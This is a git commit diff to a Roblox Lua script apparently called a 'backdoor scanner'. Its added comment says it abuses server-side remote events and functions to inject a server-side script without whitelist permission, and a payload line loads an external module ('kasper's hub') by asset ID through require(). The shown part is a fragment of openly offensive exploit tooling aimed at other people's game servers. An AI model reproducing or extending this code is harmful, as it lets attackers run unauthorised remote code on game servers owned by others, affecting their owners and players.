8d8dc6ed13b398d581d3f34a5363fc59459f639b
jaackksiscool <93211307+jaackkiscool@users.noreply.github.com>
2022-06-10 14:00:54 +0300

    Update backdoorscanner.lua

--- backdoorscanner.lua
+++ backdoorscanner.lua
@@ -1,3 +1,10 @@
+--[[ 
+backdoorscanner.lua
+
+this is a script to manipulate serverside remoteevent's & remotefunctions to inject a serverside script into them without granted whitelist
+
+]]
+
 -- old version was like 700+ lines but reverted it since this works amazing with just 11 lines
 
 code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- this will load kasper's hub so you can edit it up if u know how lol
